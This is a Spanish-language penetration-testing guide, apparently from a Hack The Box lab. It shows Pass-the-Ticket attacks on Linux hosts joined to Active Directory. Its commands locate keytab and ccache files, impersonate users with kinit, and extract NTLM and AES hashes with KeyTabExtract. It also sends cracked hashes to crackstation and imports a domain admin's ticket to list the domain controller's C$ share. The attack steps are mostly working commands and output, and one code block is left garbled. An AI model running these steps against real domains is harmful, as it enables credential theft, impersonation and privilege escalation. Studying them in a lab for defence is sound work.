## Introduccion
Igual que podemos unir un cliente windows a un dominio AD de microsoft, tambien podemos unir a este tipo de dominios un cliente Linux. En este apartado se ve como realizar un PtT en Linux, obteniendo los tickets y utilizandolos como en un entorno windows.

La mayoria de maquinas Linux almacenan los tickets en ficheros **ccache** en el directorio /tmp. Por defecto, la ubicación del ticket de Kerberos se almacena en la variable de entorno `KRB5CCNAME`. Esta variable puede identificar si se están utilizando tickets de Kerberos o si se ha cambiado la ubicación por defecto para almacenar los tickets de Kerberos

Otro uso cotidiano de Kerberos en Linux es con archivos [keytab](https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro). Un `keytab` es un archivo que contiene pares de principales de Kerberos y claves cifradas (que se derivan de la contraseña de Kerberos).
Los archivos `Keytab` comúnmente permiten que los scripts se autentiquen automáticamente usando Kerberos sin requerir interacción humana o acceso a una contraseña almacenada en un archivo de texto plano.

### Identificar integracion Linux - AD
Con realm list podremos ver informacion acerca del dominio unido, incluso grupos y usuarios a los que pertenecemos
```bash
eddy@htb~:$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
...
```

Si no tenemos el comando realm se puede buscar con `ps` a ver si tenemos corriendo servicios como `sssd` o `winbind` para saber si la maquina esta unida a algun dominio
```bash
ps -ef | grep -i "winbind\|sssd"
```

## Encontrando ficheros KeyTab
```
find / -name *keytab* -ls 2>/dev/null
```
>Para usar un archivo keytab, debemos tener privilegios de lectura y escritura (rw) sobre el archivo.


Con crontab. Podemos ver que utiliza `kinit` (que basicamente lo que hace es solicitar un TGT y almacenarlo como ccache)
```
linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
...SNIP...
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

## Encontrando archivos ccache
Buscando en variables de entorno y/o en /tmp
```
env | grep -i krb5
KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
------------

ls -la /tmp
-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau

```

---

### Abusando de ficheros KeyTab
#### Utilizar un fickero keytab
Listar informacion de un fichero keytab
```
klist -k -t /opt/specialfiles/carlos.keytab


Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

Comprobar que ticket estamos usando
```
klist
```

Suplantar identidad con kinit
```bash
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# Aqui podemos luego volver a comprobar el ticket para ver si efectivamente estamos usando el de karlos con:

klist
```

conectarse a un recurso SMB utilizando el ticket importado:
```bash
smbclient //dc01/carlos -k -c ls
```

#### Abusar de un keytab para extraer NTLM hash
https://github.com/sosdave/KeyTabExtract

Con el siguiente comando extraemos el ntlm hash, aes256 hash, etc. para asi poder aprovechar a hacer un pass the hash y no solo utilizar el ticket para abusar de su identidad ante un servicio sino para ganar acceso a la maquina.

```
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
``` /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

Podemos ahora crackear con hashcat o mirar en https://crackstation.net/

Login como usuario de dominio en maquina linux tras crackear el hash:
```
su - carlos@inlanefreight.htb
```

Una vez suplantada la identidad podriamos volver a mirar nuevos ficheros keytab y volver a suplantar nuevas identidades o abusar de ellas.

## Abusando ficheros ccache

Habiendo encontrado ficheros ccache (por ejemplo en /tmp), quizas podamos enumerar a que grupos pertenece algunos de esos usuarios de los ficheros ccache. porque si alguno pertenece a domain admins o a algun grupo interesante podemos ir elevando privilegios poco a poco realizando movimientos laterales.

```
root@linux01:~# id julio@inlanefreight.htb

uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
```

Mirando que tickets tenemos importados
```
klist
```

Importar el ccache, declarandolo en la variable
```bash 
# Copiar el fichero a nuestro directorio y exportar la variable con la ruta de ese fichero ccache
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133

klist

#OUTPUT
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
```

Probar a conectarse a un SMB utilizando el ccache importado
```bash
smbclient //dc01/C$ -k -c ls -no-pass
```
>klist muestra la información del ticket. Debemos considerar los valores "valid starting" y "expires".

